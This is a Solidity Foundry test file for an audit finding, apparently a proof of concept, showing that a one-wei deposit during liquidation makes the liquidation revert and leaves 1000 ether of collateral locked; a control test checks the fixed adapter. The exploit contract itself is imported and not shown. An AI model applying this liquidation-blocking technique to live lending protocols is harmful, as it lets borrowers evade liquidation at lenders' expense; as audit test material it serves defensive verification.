// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Token,
    ERC20AssetAdapterFixed,
    LendingPool,
    StabilityPool,
    DepositsDisabledDuringLiquidation
} from "./66369-h-28-deposits-during-liquidation-enable-collateral-lockup-pa.sol";

contract Finding66369Test is Test {
    function test_exploit_one_wei_deposit_locks_collateral() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.token().balanceOf(address(e.adapter())), 1000 ether + 1, "adapter holds seed plus 1 wei");
        assertEq(e.locked(), 1000 ether + 1, "locked");
        assertEq(e.stability().seized(), 0, "nothing seized");
        assertTrue(e.liquidationReverted(), "liquidation reverted");
        assertEq(e.adapter().balances(address(e)), 1000 ether + 1, "borrower balance no longer matches");
    }

    function test_control_deposit_blocked_and_seed_is_seized() public {
        Token token = new Token();
        ERC20AssetAdapterFixed adapter = new ERC20AssetAdapterFixed(token);
        LendingPool pool = new LendingPool(adapter);
        StabilityPool stability = new StabilityPool(token);
        adapter.setPool(address(pool));
        adapter.setStability(address(stability));

        token.mint(address(this), 1000 ether + 1);
        token.approve(address(adapter), 1000 ether + 1);
        pool.openAndSeed(abi.encode(uint256(1000 ether)));
        pool.beginLiquidation(address(this));

        vm.expectRevert(DepositsDisabledDuringLiquidation.selector);
        pool.depositAsset(address(adapter), abi.encode(uint256(1)));

        stability.liquidateBorrower(address(adapter), address(this), abi.encode(uint256(1000 ether)));

        assertEq(adapter.balances(address(this)), 0, "balance cleared");
        assertEq(token.balanceOf(address(adapter)), 0, "adapter empty");
        assertEq(token.balanceOf(address(stability)), 1000 ether, "stability received 1000");
        assertEq(stability.seized(), 1000 ether, "seized 1000");
        assertEq(token.balanceOf(address(this)), 1, "front-run wei stayed with borrower");
    }
}
